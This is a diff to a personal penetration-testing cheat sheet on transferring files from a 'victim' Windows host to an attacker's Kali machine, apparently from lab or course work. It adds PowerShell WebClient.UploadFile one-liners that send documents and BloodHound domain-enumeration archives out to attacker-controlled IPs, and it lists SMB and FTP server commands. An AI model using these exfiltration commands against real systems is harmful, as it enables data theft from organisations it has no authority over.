@@ -1,5 +1,8 @@
 # Transferring Files
 
+https://github.com/eMVee-NL/MindMap/tree/main/File-Transfer
+
+
 Nothing is 100% bullet-proof. This is why I have several options to accomplish this.
 1- As already mentioned, impacket-smbserver -smb2support test . is gold.
 2- python -m pyftpdlib -w will spawn a ftp server on you kali. use the ftp command on windows to transfer the file(s).
@@ -17,6 +20,12 @@ Use a webbrowser on the victim to access the page and upload the desired file or
 
 powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
 
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:8888/upload.php', 'bloodhound.zip')
+
+
+sudo systemctl apache2 start
+sudo php -S 0.0.0.0:80
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.238:90/upload.php', 'bloodhound.zip')
 
 ### Powershell Linux to Windows
 ````
@@ -128,7 +137,7 @@ service apache2 start
 ps -ef | grep apache
 `````
 ````
-powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
+powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.134.254:9999/upload.php', '.\dc_20240822153055_BloodHound.zip')"
 ````
 ````
 service apache2 stop
